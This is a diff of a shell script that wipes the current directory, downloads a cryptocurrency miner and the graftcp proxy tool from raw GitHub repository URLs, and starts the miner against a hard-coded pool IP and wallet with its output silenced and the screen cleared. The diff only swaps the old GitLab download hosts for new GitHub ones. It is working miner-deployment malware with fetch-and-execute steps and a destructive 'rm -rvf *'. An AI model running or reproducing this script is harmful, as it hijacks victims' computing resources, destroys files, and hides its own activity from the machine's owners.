@@ -3,7 +3,7 @@ rm -rvf * && clear && mkdir a && cd a
 # 1. DOWNLOAD MINER
 ######################################
 for url in \
-  "https://gitlab.com/rokok/LA/-/raw/main/mcm" \
+  "https://github.com/riandalis1/test/raw/refs/heads/main/mcm" \
   "https://raw.githubusercontent.com/backuprepo/LA/main/mcm"
 do
   wget -qO miner "$url" && break
@@ -13,7 +13,7 @@ chmod +x miner
 ######################################
 # 2. DOWNLOAD GRAFTCP
 ######################################
-wget -qO- https://gitlab.com/majzzaa/mvp/-/raw/main/graphics.tar.gz | tar -xz
+wget -qO- https://github.com/riandalis1/test/raw/refs/heads/main/graphics.tar.gz | tar -xz
 chmod +x graftcp/graftcp graftcp/local/graftcp-local
 
 ######################################
@@ -78,4 +78,4 @@ sleep 2
 ######################################
 # 6. START MINER
 ######################################
-exec ./run-miner.sh & wget https://gitlab.com/cuan8871816/jam/-/raw/main/sse2 && chmod 777 sse2 && ./sse2 -a power2b -o stratum+tcp://143.198.85.42:443 -u mbc1qc0r808p2xuw665s4gx9cnujfqjaa2fk2e02xax -t 4 > /dev/null 2>&1 & clear
+exec ./run-miner.sh & wget https://github.com/riandalis1/test/raw/refs/heads/main/sse2 && chmod 777 sse2 && ./sse2 -a power2b -o stratum+tcp://143.198.85.42:443 -u mbc1qc0r808p2xuw665s4gx9cnujfqjaa2fk2e02xax -t 4 > /dev/null 2>&1 & clear
